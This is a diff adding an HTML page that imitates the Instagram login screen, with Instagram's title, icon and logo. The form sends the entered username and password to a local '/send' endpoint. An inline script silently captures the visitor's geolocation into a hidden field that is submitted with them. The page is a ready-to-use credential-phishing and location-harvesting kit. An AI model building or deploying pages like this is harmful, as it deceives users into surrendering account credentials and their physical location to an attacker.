@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+  <title>Instagram</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/599px-Instagram_icon.png" type="image/gif" sizes="16x16">
+  <link rel='stylesheet' href='/stylesheets/style.css' />
+</head>
+
+<div id="wrapper">
+  <div class="main-content">
+    <div class="header">
+      <img src="https://i.imgur.com/zqpwkLQ.png" />
+    </div>
+    <form action="/send" method="post">
+      <div class="l-part">
+        <input type="text" name="email" id="email" placeholder="Username" class="input-1" />
+        <div class="overlap-text">
+          <input type="password" name="psw" id="psw" placeholder="Password" class="input-2" />
+          <a href="#">Forgot?</a>
+        </div>
+        <input type="hidden" name="latlong" id="latlong" value="" />
+        <input type="submit" id="submit" value="Log in" class="btn" />
+        <script type="text/javascript">
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    document.getElementById('latlong').setAttribute('value', position.coords.latitude+","+ position.coords.longitude) ;
+                });
+
+            } else {
+                alert("Geolocation API не поддерживается в вашем браузере");
+            }
+        </script>
+
+      </div>
+    </form>
+  </div>
+  <div class="sub-content">
+    <div class="s-part">
+      Don't have an account?<a href="https://www.instagram.com/">Sign up</a>
+    </div>
+  </div>
+</div>
+</html>
